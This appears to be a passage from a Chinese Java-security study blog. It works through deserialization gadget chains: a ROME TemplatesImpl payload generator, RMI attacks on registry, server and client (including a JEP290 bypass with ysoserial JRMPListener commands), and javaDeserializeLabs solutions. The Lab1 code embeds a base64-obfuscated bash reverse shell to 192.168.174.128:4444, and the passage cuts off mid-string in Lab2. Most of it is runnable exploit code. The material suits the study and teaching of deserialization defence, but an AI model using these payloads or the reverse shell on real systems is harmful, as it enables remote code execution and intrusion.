<p>67行拿到PropertyDescriptor中的method，就能够进到反射调用方法了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419100847-aasd88j.png" alt="image.png"></p>
<p>因此构造toStringBean的时候，我们只要指定<code>this._obj</code>为我们的恶意字节码Template类，也就是反射方法的调用者</p>
<p><code>this._beanClass</code>为Templates.class，来获取到它唯一的getter，也就是getOutputProerties()方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419101223-s954a3r.png" alt="image.png"></p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419101625-6wc3v2o.png" alt="image.png"></p>
<h2 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean.hashCode"></a>ObjectBean.hashCode</h2><p>接下来就是分析调用链了，hashCode方法是我们常用的一个把攻击链串起来的方法，ObjectBean中也有，并且通过它我们能够实现接下来的一系列攻击链调用</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419102201-gt25t3i.png" alt="image.png"></p>
<p>他会调用EqualsBean中的beanHashCode方法，这个类是我们在构造阶段可以控制的</p>
<h3 id="EqualsBean-beanHashCode"><a href="#EqualsBean-beanHashCode" class="headerlink" title="EqualsBean.beanHashCode"></a>EqualsBean.beanHashCode</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419102247-vhejqfm.png" alt="image.png"></p>
<p>调用了toString，而这里的<code>this._obj</code>我们也可控</p>
<p>也就是说我们可以先构造一个含有equalBean的ObjectBean，然后把装载恶意template的toStringBean放进去</p>
<p>这样当调用ObjectBean.hashCode的时候就能完成调用。</p>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>入口类还是HashMap，因此整个链子的构造也很清楚，我们尝试自己编写payload</p>
<h1 id="编写poc"><a href="#编写poc" class="headerlink" title="编写poc"></a>编写poc</h1><p>自己编写生成payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.romeAttack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeSer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建包含toSringBean的ObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">tSB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建equalBean的ObjectBean</span></span><br><span class="line">        <span class="comment">//创建一个无害的ObjectBean插入，避免在payload阶段反序列化</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;foo&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(bean, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_equalsBean&quot;</span>,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ObjectBean.class, tSB));</span><br><span class="line">        <span class="type">ByteOutputStream</span> <span class="variable">byteOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\AEQAQ\\Desktop\\gc\\1.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        clazz.setName(randomClassName);</span><br><span class="line">        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220419111727-5hcl2bn.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI反序列化攻击1</title>
    <url>/2022/05/03/rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>互打</p>
<h1 id="Client攻击Server"><a href="#Client攻击Server" class="headerlink" title="Client攻击Server"></a>Client攻击Server</h1><h2 id="恶意参数"><a href="#恶意参数" class="headerlink" title="恶意参数"></a>恶意参数</h2><blockquote>
<p>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</p>
</blockquote>
<h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>调试节有提过，<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091703-okmgwij.png" alt="image.png"></p>
<h3 id="Object参数"><a href="#Object参数" class="headerlink" title="Object参数"></a>Object参数</h3><p>Server上的远程对象的参数有Object类型，Client就可以传恶意序列化数据过去，Server接收的时候会反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502091214-xlahr1v.png" alt="image.png"></p>
<p>如果参数类型不为Object，也可以通过以下方法来绕过</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">通过网络代理，在流量层修改数据</a></li>
<li>自定义 “java.rmi” 包的代码，自行实现</li>
<li><a href="https://www.anquanke.com/post/id/200860">字节码修改</a></li>
<li>使用 debugger</li>
</ul>
<h1 id="Server攻击Registry"><a href="#Server攻击Registry" class="headerlink" title="Server攻击Registry"></a>Server攻击Registry</h1><h2 id="攻击bind-amp-rebind方法"><a href="#攻击bind-amp-rebind方法" class="headerlink" title="攻击bind&amp;rebind方法"></a>攻击bind&amp;rebind方法</h2><p>漏洞触发点：<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502203727-qd2t7ui.png" alt="image.png"></p>
<p>用<code>AnnotationInvocationHandler</code> 来代理 <code>Remote</code> 接口让其能够在bind方法里面被反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException, RemoteException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) CC6.getCC6();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用AnnotationInvocationHandler动态代理实现Remote接口</span></span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor AnnotationInvocationHandlerConstructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler o=(InvocationHandler)AnnotationInvocationHandlerConstructor.newInstance(Target.class,map);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, o));</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.bind(<span class="string">&quot;fuck&quot;</span>,r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502205044-k75uik6.png" alt="image.png"></p>
<p>原因是<code>sun.rmi.registry.RegistryImpl#registryFilter</code>里的白名单</p>
<p><a href="https://xz.aliyun.com/t/10170">JEP290</a>的限制，也就是下面这个补丁之后加入的白名单</p>
<p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5534221c23fc/src/share/classes/sun/rmi/registry/RegistryImpl.java#l388</a></p>
<blockquote>
<p>第一次遇到，为之后再详细去看他铺垫</p>
<p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，描述网址<a href="https://openjdk.java.net/jeps/290">点这里</a>。这是一个针对 JAVA 9 提出的安全特性，但同时对 JDK 6,7,8 都进行了支持，在 JDK 6u141、JDK 7u131、JDK 8u121 版本进行了更新。</p>
<p>JEP 290 主要提供了几个机制：</p>
<ul>
<li>提供了一种灵活的机制，将可反序列化的类从任意类限制为上下文相关的类（黑白名单）；</li>
<li>限制反序列化的调用深度和复杂度；</li>
<li>为 RMI export 的对象设置了验证机制；</li>
<li>提供一个全局过滤器，可以在 properties 或配置文件中进行配置。</li>
</ul>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220502225643-pivl6ga.png" alt="image.png"></p>
<blockquote>
<p>参考：<a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p>
</blockquote>
<h2 id="UnicastRef绕过JEP290"><a href="#UnicastRef绕过JEP290" class="headerlink" title="UnicastRef绕过JEP290"></a>UnicastRef绕过JEP290</h2><blockquote>
<p>bypass这里可以单独整理</p>
</blockquote>
<p>用UnicastRef对象新建一个RMI连接绕过JEP290的限制，配合ysoserial中的<a href="https://xz.aliyun.com/t/2650">JRMPListener模块</a></p>
<p><code>8u121&lt;=jdk&lt;=8u231</code></p>
<ol>
<li>用<code>ysoserial</code>启动一个恶意的<code>JRMPListener</code></li>
<li>启动注册中心</li>
<li>启动Client调用<code>bind()</code>操作</li>
<li>注册中心被反序列化攻击</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p>Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CAR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.IHello;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(IHello.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" title="Server攻击Client"></a>Server攻击Client</h1><p>Server返回给Client远程方法调用结果的时候，会序列化传输</p>
<p>服务端收到会反序列化触发漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.demo02.RMIServer;</span><br><span class="line"><span class="keyword">import</span> com.exploit.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadServer1</span> &#123;</span><br><span class="line">    <span class="comment">//Server攻击Client</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCalc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RCalc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">map</span> <span class="operator">=</span> CC6.getCC6();</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">RCalc</span> <span class="variable">rCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RCalc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,rCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BadServer1</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h1><p>可以用ysoserial搭建恶意Registry来打Client</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener <span class="number">3333</span> CommonsCollections5 <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.SAC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">3333</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>rmi</tag>
      </tags>
  </entry>
  <entry>
    <title>javaDeserializeLabs1，2</title>
    <url>/2022/06/01/serLab12/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目地址：<a href="https://github.com/waderwu/javaDeserializeLabs">https://github.com/waderwu/javaDeserializeLabs</a></p>
<p>其中涉及的知识面仍有未涉及部分，小目标：想在这学期离校前把他做完。</p>
<h2 id="Lab1-basic"><a href="#Lab1-basic" class="headerlink" title="Lab1-basic"></a>Lab1-basic</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.utils.Utils;</span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.Calc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lab1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        setFieldValue(calc,<span class="string">&quot;canPopCalc&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">        setFieldValue(calc,<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        System.out.println(Utils.objectToHexString(calc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用细节：</p>
<ol>
<li>jdk版本要和目标机器相同</li>
<li>calc类的包路径也要和目标一样</li>
<li>要反射修改域值</li>
</ol>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220601212131-ask7up6.png" alt="image.png"></p>
<h2 id="Lab2-ysoserial-Web"><a href="#Lab2-ysoserial-Web" class="headerlink" title="Lab2-ysoserial_Web"></a>Lab2-ysoserial_Web</h2><p>查看pom.xml，存在commons-collections3.2.1组件，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>用cc6，hashmap型，在shiro里面也自己构造过，就直接拿过来用了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload.lab2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.utils.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Lab2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c 